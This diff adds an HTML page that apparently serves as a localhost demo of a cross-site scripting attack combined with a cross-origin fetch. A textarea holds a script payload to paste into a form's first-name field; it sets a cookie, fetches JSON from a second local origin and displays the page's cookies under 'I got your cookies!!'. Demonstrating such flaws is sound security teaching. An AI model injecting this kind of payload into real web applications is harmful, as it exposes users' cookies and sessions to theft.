@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS CORS Form Attack</title>
+
+  </head>
+<body>
+
+<h2>CORS HTML Form XSS Attack</h2>
+<br>
+<hr>
+<form action="https://localhost:7443/xss-form" method="POST">
+  <label for="fname">First name:</label><br>
+  <input type="text" id="fname" name="fname" value="John"><br>
+  <label for="lname">Last name:</label><br>
+  <input type="text" id="lname" name="lname" value="Doe"><br><br>
+  <input type="submit" value="Submit">
+</form> 
+<br>
+<hr>
+
+
+<textarea rows="10" cols="150">
+
+      use this in first name:
+
+
+      <div id="json-output"> </div>
+      <script> 
+      document.cookie = "Password=Abc123!!!";
+      fetch("https://localhost:9443//json")
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(json => {
+                    const jsonOutput = document.getElementById('json-output');
+                    jsonOutput.innerHTML += `<pre>${JSON.stringify(json, null, 2)} <br>I got your cookies!!: "  ${document.cookie} </pre>`;
+                });;</script>       
+
+</textarea>
+
+</body>
+</html>
